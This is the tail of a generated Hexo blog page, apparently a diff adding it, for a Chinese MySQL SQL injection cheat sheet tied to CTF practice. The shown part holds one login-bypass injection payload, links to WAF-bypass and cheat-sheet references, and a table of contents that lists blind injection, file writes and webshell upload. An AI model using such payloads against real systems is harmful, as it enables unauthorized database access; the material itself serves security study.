+<li>‘) or (‘1’=’1—</li>
+</ul>
+<h1 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h1><p>请见：<a href="https://chybeta.gitbooks.io/waf-bypass/content/sql-injection/ji-ben-guo-waf-zi-shi-hui-zong.html" target="_blank" rel="external">WAF Bypass:SQL Injection</a></p>
+<h2 id="sqlmap-tamper编写"><a href="#sqlmap-tamper编写" class="headerlink" title="sqlmap-tamper编写"></a>sqlmap-tamper编写</h2><h1 id="版本特性"><a href="#版本特性" class="headerlink" title="版本特性"></a>版本特性</h1><ul>
+<li>mysql5.0以后  information.schema库出现</li>
+<li>mysql5.1以后 udf 导入xx\lib\plugin\ 目录下</li>
+<li>mysql5.x以后 system执行命令</li>
+</ul>
+<h1 id="常见sql注入位置"><a href="#常见sql注入位置" class="headerlink" title="常见sql注入位置"></a>常见sql注入位置</h1><ul>
+<li>常见GET、POST参数</li>
+<li>登陆框</li>
+<li>http头</li>
+</ul>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="自动sql注入测试"><a href="#自动sql注入测试" class="headerlink" title="自动sql注入测试"></a>自动sql注入测试</h2><ul>
+<li><a href="http://sqlmap.org/" target="_blank" rel="external">sqlmap</a></li>
+<li>Pangolin</li>
+<li>啊D</li>
+</ul>
+<h2 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h2><ul>
+<li><a href="https:s//portswigger.net/burp/" target="_blank" rel="external">Burp Suite</a></li>
+<li><a href="https://addons.mozilla.org/en-US/firefox/addon/hackbar1/?src=search" target="_blank" rel="external">firefox::HackBar</a></li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="http://websec.ca/kb/sql_injection#MySQL_Testing_Injection" target="_blank" rel="external">MySQL_Testing_Injection</a></li>
+<li><a href="http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/" target="_blank" rel="external">MySQL SQL Injection Cheat Sheet</a></li>
+<li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#Enablecmdshell" target="_blank" rel="external">SQL Injection Cheat Sheet</a></li>
+<li><a href="https://www.waitalone.cn/mysql-injection-summary.html" target="_blank" rel="external">独自等待：MySQL注入总结</a></li>
+</ul>
+
+      
+    </div>
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2017/07/21/MySql注入备忘录/">MySql注入备忘录</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
+  <p><span>发布时间:</span>2017年07月21日 - 14:07</p>
+  <p><span>最后更新:</span>2017年07月22日 - 09:07</p>
+  <p><span>原始链接:</span><a href="/2017/07/21/MySql注入备忘录/" title="MySql注入备忘录">http://yoursite.com/2017/07/21/MySql注入备忘录/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/07/21/MySql注入备忘录/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+
+      
+	</div>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/wechat.jpg?raw=true" alt="chybeta WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/07/19/Meenpwn-2017-crypto-writeup/" rel="next" title="Meenpwn-2017-crypto-writeup">
+                <i class="fa fa-chevron-left"></i> Meenpwn-2017-crypto-writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="prev" title="ACM-OJ[长期更新]">
+                ACM-OJ[长期更新] <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTAzNC81NjAz"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="chybeta" />
+          <p class="site-author-name" itemprop="name">chybeta</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">59</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">38</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/CHYbeta" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ph0en1x.com/" title="XMU-Ph0en1x" target="_blank">XMU-Ph0en1x</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://lxpark.com/" title="lzhtony" target="_blank">lzhtony</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.cnblogs.com/findneo/" title="findneo" target="_blank">findneo</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基本"><span class="nav-number">2.</span> <span class="nav-text">基本</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看当前数据库版本"><span class="nav-number">2.1.</span> <span class="nav-text">查看当前数据库版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#当前登录用户"><span class="nav-number">2.2.</span> <span class="nav-text">当前登录用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#当前使用的数据库"><span class="nav-number">2.3.</span> <span class="nav-text">当前使用的数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路径相关"><span class="nav-number">2.4.</span> <span class="nav-text">路径相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联合数据"><span class="nav-number">2.5.</span> <span class="nav-text">联合数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#字母-数字相关"><span class="nav-number">2.6.</span> <span class="nav-text">字母/数字相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#字符串截取"><span class="nav-number">2.7.</span> <span class="nav-text">字符串截取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注释"><span class="nav-number">2.8.</span> <span class="nav-text">注释</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#行间注释"><span class="nav-number">2.8.1.</span> <span class="nav-text">行间注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#行内注释"><span class="nav-number">2.8.2.</span> <span class="nav-text">行内注释</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注入技术"><span class="nav-number">3.</span> <span class="nav-text">注入技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#判断是否存在注入"><span class="nav-number">3.1.</span> <span class="nav-text">判断是否存在注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#数值型注入"><span class="nav-number">3.1.1.</span> <span class="nav-text">数值型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#字符型注入"><span class="nav-number">3.1.2.</span> <span class="nav-text">字符型注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联合查询"><span class="nav-number">3.2.</span> <span class="nav-text">联合查询</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查询列数"><span class="nav-number">3.2.1.</span> <span class="nav-text">查询列数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#UNION-SELECT"><span class="nav-number">3.2.1.1.</span> <span class="nav-text">UNION SELECT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ORDER-BY"><span class="nav-number">3.2.1.2.</span> <span class="nav-text">ORDER BY</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询数据库"><span class="nav-number">3.2.2.</span> <span class="nav-text">查询数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询表名"><span class="nav-number">3.2.3.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查询列名"><span class="nav-number">3.2.4.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取数据"><span class="nav-number">3.2.5.</span> <span class="nav-text">获取数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#insert-update-delete注入"><span class="nav-number">3.3.</span> <span class="nav-text">insert/update/delete注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by后注入"><span class="nav-number">3.4.</span> <span class="nav-text">order by后注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">3.4.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入"><span class="nav-number">3.5.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#盲注"><span class="nav-number">3.6.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注场景"><span class="nav-number">3.6.1.</span> <span class="nav-text">盲注场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#布尔盲注-基于响应"><span class="nav-number">3.6.2.</span> <span class="nav-text">布尔盲注-基于响应</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#payload-1"><span class="nav-number">3.6.2.1.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#脚本"><span class="nav-number">3.6.2.2.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#延时盲注-基于时间"><span class="nav-number">3.6.3.</span> <span class="nav-text">延时盲注-基于时间</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#检测方法"><span class="nav-number">3.6.3.1.</span> <span class="nav-text">检测方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload-2"><span class="nav-number">3.6.3.2.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入"><span class="nav-number">3.7.</span> <span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">3.7.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-3"><span class="nav-number">3.7.2.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#吃掉"><span class="nav-number">3.7.2.1.</span> <span class="nav-text">吃掉\</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用"><span class="nav-number">3.7.2.2.</span> <span class="nav-text">利用\</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二次注入"><span class="nav-number">3.8.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件读写"><span class="nav-number">3.9.</span> <span class="nav-text">文件读写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#load-file-读取"><span class="nav-number">3.9.1.</span> <span class="nav-text">load_file()读取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#条件"><span class="nav-number">3.9.1.1.</span> <span class="nav-text">条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload-4"><span class="nav-number">3.9.1.2.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#select导出"><span class="nav-number">3.9.2.</span> <span class="nav-text">select导出</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#条件-1"><span class="nav-number">3.9.2.1.</span> <span class="nav-text">条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload-5"><span class="nav-number">3.9.2.2.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写入webshell"><span class="nav-number">3.9.2.3.</span> <span class="nav-text">写入webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#条件-2"><span class="nav-number">3.9.2.3.1.</span> <span class="nav-text">条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-6"><span class="nav-number">3.9.2.3.2.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">3.10.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#万能密码后台登陆"><span class="nav-number">3.11.</span> <span class="nav-text">万能密码后台登陆</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过技巧"><span class="nav-number">4.</span> <span class="nav-text">绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap-tamper编写"><span class="nav-number">4.1.</span> <span class="nav-text">sqlmap-tamper编写</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#版本特性"><span class="nav-number">5.</span> <span class="nav-text">版本特性</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#常见sql注入位置"><span class="nav-number">6.</span> <span class="nav-text">常见sql注入位置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工具"><span class="nav-number">7.</span> <span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#自动sql注入测试"><span class="nav-number">7.1.</span> <span class="nav-text">自动sql注入测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#辅助工具"><span class="nav-number">7.2.</span> <span class="nav-text">辅助工具</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chybeta</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("unqDDYqYUADBUogKkMVqqvFH-gzGzoHsz", "afr1xO80LoKo0xCpxHJCleC4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  <script type='text/javascript' color='252,3,184' zIndex='-1' opacity='20' count='99' src='//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js'></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
